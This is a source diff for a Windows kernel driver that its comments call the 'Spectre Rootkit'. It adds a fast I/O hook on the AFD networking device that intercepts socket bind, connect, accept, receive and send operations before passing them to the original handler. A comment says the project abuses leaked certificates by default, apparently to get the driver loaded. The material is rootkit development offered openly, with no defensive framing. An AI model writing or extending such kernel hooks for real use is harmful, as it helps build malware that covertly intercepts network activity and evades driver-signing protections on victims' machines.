@@ -78,6 +78,41 @@ NTSTATUS HookIoctl (
 //	ExFreePoolWithTag(DeviceHook, 'hFpS');
 //}
 
+BOOLEAN HookFastIoctl (
+	_In_ PFILE_OBJECT FileObject,
+	_In_ BOOLEAN Wait,
+	_In_ PVOID InputBuffer,
+	_In_ ULONG InputBufferLength,
+	_Out_ PVOID OutputBuffer,
+	_In_ ULONG OutputBufferLength,
+	_In_ ULONG IoControlCode,
+	_Out_ PIO_STATUS_BLOCK IoStatus,
+	_In_ PDEVICE_OBJECT DeviceObject
+	)
+{
+	//DBGPRINT("HookFastIoctl: IRP_MJ_DEVICE_CONTROL IOCTL(0x%X)", IoControlCode);
+	switch (IoControlCode)
+	{
+	case IOCTL_AFD_BIND:
+		DBGPRINT("HookFastIoctl: IOCTL_AFD_BIND.");
+		break;
+	case IOCTL_AFD_CONNECT:
+		DBGPRINT("HookFastIoctl: IOCTL_AFD_CONNECT.");
+		break;
+	case IOCTL_AFD_ACCEPT:
+		DBGPRINT("HookFastIoctl: IOCTL_AFD_ACCEPT.");
+		break;
+	case IOCTL_AFD_RECV:
+		DBGPRINT("HookFastIoctl: IOCTL_AFD_RECV.");
+		break;
+	case IOCTL_AFD_SEND:
+		//DBGPRINT("HookFastIoctl: IOCTL_AFD_SEND.");
+		break;
+	}
+
+	return FileObjHook::OriginalFastIo.FastIoDeviceControl(FileObject, Wait, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, IoControlCode, IoStatus, DeviceObject);
+}
+
 /**
 	Initialize the Spectre Rootkit.
 	@param DriverObject - The object associated with the driver.
@@ -90,6 +125,8 @@ DriverEntry (
 	_In_ PUNICODE_STRING RegistryPath
 	)
 {
+	FAST_IO_DISPATCH fastIoHooks;
+
 	//
 	// We don't know if these parameters are valid.
 	// Although this project abuses leaked certificates by default,
@@ -99,6 +136,11 @@ DriverEntry (
 	//
 	UNREFERENCED_PARAMETER(DriverObject);
 	UNREFERENCED_PARAMETER(RegistryPath);
-	DeviceHook = new (NonPagedPool, 'hFpS') FileObjHook(L"Afd", DirectHook, HookIoctl);
+
+	memset(&fastIoHooks, 0, sizeof(fastIoHooks));
+	fastIoHooks.SizeOfFastIoDispatch = sizeof(FAST_IO_DISPATCH);
+	fastIoHooks.FastIoDeviceControl = HookFastIoctl;
+
+	DeviceHook = new (NonPagedPool, 'hFpS') FileObjHook(L"Afd", DirectHook, HookIoctl, &fastIoHooks);
 	return STATUS_SUCCESS;
 }
